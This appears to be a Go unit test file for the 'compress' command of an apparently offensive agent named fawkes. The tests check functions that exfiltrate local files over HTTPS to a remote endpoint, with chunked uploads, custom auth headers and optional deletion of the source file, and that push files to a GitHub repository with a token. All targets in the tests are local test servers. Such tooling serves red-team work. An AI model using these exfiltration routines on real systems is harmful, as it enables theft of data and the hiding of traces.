package commands

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"sync/atomic"
	"testing"

	"fawkes/pkg/structs"
)

func makeTestTask() structs.Task {
	return structs.NewTask("test-id", "compress", "")
}

func TestExfilHTTPSSingleUpload(t *testing.T) {
	// Create a test HTTPS server
	var receivedBytes int64
	var receivedMethod string
	server := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		receivedMethod = r.Method
		buf := make([]byte, 1024)
		for {
			n, err := r.Body.Read(buf)
			receivedBytes += int64(n)
			if err != nil {
				break
			}
		}
		w.WriteHeader(200)
	}))
	defer server.Close()

	// Create test file
	tmpDir := t.TempDir()
	testFile := filepath.Join(tmpDir, "secret.dat")
	data := []byte("top secret exfil data for testing")
	if err := os.WriteFile(testFile, data, 0644); err != nil {
		t.Fatal(err)
	}

	// Build cloud params
	cloudParams := cloudExfilParams{
		URL:    server.URL + "/upload",
		Method: "PUT",
	}
	cloudJSON, _ := json.Marshal(cloudParams)

	params := CompressParams{
		Action: "exfil-https",
		Path:   testFile,
		Output: string(cloudJSON),
	}

	result := compressExfilHTTPS(makeTestTask(), params)
	if result.Status != "success" {
		t.Fatalf("expected success, got %s: %s", result.Status, result.Output)
	}

	if receivedMethod != "PUT" {
		t.Errorf("expected PUT method, got %s", receivedMethod)
	}

	if receivedBytes != int64(len(data)) {
		t.Errorf("expected %d bytes uploaded, got %d", len(data), receivedBytes)
	}

	// Verify result metadata
	var meta httpsExfilResult
	if err := json.Unmarshal([]byte(result.Output), &meta); err != nil {
		t.Fatal(err)
	}
	if meta.Status != "transferred" {
		t.Errorf("expected status=transferred, got %s", meta.Status)
	}
	if meta.FileSize != int64(len(data)) {
		t.Errorf("expected file_size=%d, got %d", len(data), meta.FileSize)
	}
	if meta.SHA256 == "" {
		t.Error("expected non-empty SHA256")
	}
}

func TestExfilHTTPSChunkedUpload(t *testing.T) {
	var chunkCount int32
	var totalReceived int64

	server := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		atomic.AddInt32(&chunkCount, 1)
		buf := make([]byte, 1024)
		for {
			n, err := r.Body.Read(buf)
			atomic.AddInt64(&totalReceived, int64(n))
			if err != nil {
				break
			}
		}
		// Verify chunk headers
		if r.Header.Get("X-Chunk-Number") == "" {
			t.Error("expected X-Chunk-Number header")
		}
		w.WriteHeader(200)
	}))
	defer server.Close()

	// Create a file that will need multiple 100-byte chunks
	tmpDir := t.TempDir()
	testFile := filepath.Join(tmpDir, "large.dat")
	data := make([]byte, 500)
	for i := range data {
		data[i] = byte(i % 256)
	}
	if err := os.WriteFile(testFile, data, 0644); err != nil {
		t.Fatal(err)
	}

	cloudParams := cloudExfilParams{
		URL:       server.URL + "/upload",
		Method:    "POST",
		ChunkSize: 100,
	}
	cloudJSON, _ := json.Marshal(cloudParams)

	params := CompressParams{
		Action: "exfil-https",
		Path:   testFile,
		Output: string(cloudJSON),
	}

	result := compressExfilHTTPS(makeTestTask(), params)
	if result.Status != "success" {
		t.Fatalf("expected success, got %s: %s", result.Status, result.Output)
	}

	if atomic.LoadInt32(&chunkCount) < 5 {
		t.Errorf("expected at least 5 chunks for 500 bytes at 100/chunk, got %d", chunkCount)
	}

	if atomic.LoadInt64(&totalReceived) != int64(len(data)) {
		t.Errorf("expected total %d bytes, got %d", len(data), totalReceived)
	}
}

func TestExfilHTTPSCustomHeaders(t *testing.T) {
	var receivedAuth string
	server := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		receivedAuth = r.Header.Get("Authorization")
		w.WriteHeader(200)
	}))
	defer server.Close()

	tmpDir := t.TempDir()
	testFile := filepath.Join(tmpDir, "test.dat")
	os.WriteFile(testFile, []byte("data"), 0644)

	cloudParams := cloudExfilParams{
		URL:    server.URL + "/upload",
		Method: "PUT",
		Headers: map[string]string{
			"Authorization": "Bearer test-token-123",
		},
	}
	cloudJSON, _ := json.Marshal(cloudParams)

	result := compressExfilHTTPS(makeTestTask(), CompressParams{
		Action: "exfil-https",
		Path:   testFile,
		Output: string(cloudJSON),
	})

	if result.Status != "success" {
		t.Fatalf("failed: %s", result.Output)
	}

	if receivedAuth != "Bearer test-token-123" {
		t.Errorf("expected Bearer auth header, got %q", receivedAuth)
	}
}

func TestExfilHTTPSServerError(t *testing.T) {
	server := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(403)
	}))
	defer server.Close()

	tmpDir := t.TempDir()
	testFile := filepath.Join(tmpDir, "test.dat")
	os.WriteFile(testFile, []byte("data"), 0644)

	cloudParams := cloudExfilParams{URL: server.URL, Method: "PUT"}
	cloudJSON, _ := json.Marshal(cloudParams)

	result := compressExfilHTTPS(makeTestTask(), CompressParams{
		Action: "exfil-https",
		Path:   testFile,
		Output: string(cloudJSON),
	})

	if result.Status != "error" {
		t.Error("expected error for 403 response")
	}
}

func TestExfilHTTPSMissingURL(t *testing.T) {
	result := compressExfilHTTPS(makeTestTask(), CompressParams{
		Action: "exfil-https",
		Path:   "/tmp/test",
		Output: `{}`,
	})
	if result.Status != "error" {
		t.Error("expected error for missing URL")
	}
}

func TestExfilHTTPSRequiresHTTPS(t *testing.T) {
	result := compressExfilHTTPS(makeTestTask(), CompressParams{
		Action: "exfil-https",
		Path:   "/tmp/test",
		Output: `{"url":"http://insecure.example.com"}`,
	})
	if result.Status != "error" {
		t.Error("expected error for non-HTTPS URL")
	}
}

func TestExfilHTTPSCleanup(t *testing.T) {
	server := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(200)
	}))
	defer server.Close()

	tmpDir := t.TempDir()
	testFile := filepath.Join(tmpDir, "cleanup.dat")
	os.WriteFile(testFile, []byte("will be deleted"), 0644)

	cloudParams := cloudExfilParams{URL: server.URL, Method: "PUT"}
	cloudJSON, _ := json.Marshal(cloudParams)

	result := compressExfilHTTPS(makeTestTask(), CompressParams{
		Action:  "exfil-https",
		Path:    testFile,
		Output:  string(cloudJSON),
		Cleanup: true,
	})

	if result.Status != "success" {
		t.Fatalf("failed: %s", result.Output)
	}

	// File should be cleaned up
	if _, err := os.Stat(testFile); err == nil {
		t.Error("expected file to be cleaned up after exfil")
	}
}

func TestExfilGitHubMissingToken(t *testing.T) {
	result := compressExfilGitHub(makeTestTask(), CompressParams{
		Path:   "/tmp/test",
		Output: `{"repo":"owner/repo"}`,
	})
	if result.Status != "error" {
		t.Error("expected error for missing token")
	}
}

func TestExfilGitHubMissingRepo(t *testing.T) {
	result := compressExfilGitHub(makeTestTask(), CompressParams{
		Path:   "/tmp/test",
		Output: `{"token":"ghp_test"}`,
	})
	if result.Status != "error" {
		t.Error("expected error for missing repo")
	}
}

func TestExfilGitHubSuccess(t *testing.T) {
	var receivedAuth string
	var receivedMethod string
	var receivedPath string

	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		receivedAuth = r.Header.Get("Authorization")
		receivedMethod = r.Method
		receivedPath = r.URL.Path
		w.WriteHeader(201)
		fmt.Fprintf(w, `{"content":{"sha":"abc123"}}`)
	}))
	defer server.Close()

	// We need to override the GitHub API URL for testing.
	// Since the function hardcodes api.github.com, we can't easily test the full flow.
	// Instead, test the validation and parameter parsing.

	tmpDir := t.TempDir()
	testFile := filepath.Join(tmpDir, "exfil.dat")
	os.WriteFile(testFile, []byte("test data"), 0644)

	// Missing file should error
	result := compressExfilGitHub(makeTestTask(), CompressParams{
		Path:   "/nonexistent/path",
		Output: `{"token":"ghp_test","repo":"owner/repo"}`,
	})
	if result.Status != "error" {
		t.Error("expected error for missing file")
	}

	_ = receivedAuth
	_ = receivedMethod
	_ = receivedPath
}

func TestSHA256Hex(t *testing.T) {
	hash := sha256Hex([]byte("test"))
	expected := "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
	if hash != expected {
		t.Errorf("expected %s, got %s", expected, hash)
	}
}

func TestEncodeBase64Std(t *testing.T) {
	encoded := encodeBase64Std([]byte("hello world"))
	if encoded != "aGVsbG8gd29ybGQ=" {
		t.Errorf("expected aGVsbG8gd29ybGQ=, got %s", encoded)
	}
}

func TestHashFileSHA256(t *testing.T) {
	tmpDir := t.TempDir()
	f := filepath.Join(tmpDir, "hash.txt")
	os.WriteFile(f, []byte("test"), 0644)

	hash, err := hashFileSHA256(f)
	if err != nil {
		t.Fatal(err)
	}

	expected := "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
	if hash != expected {
		t.Errorf("expected %s, got %s", expected, hash)
	}
}
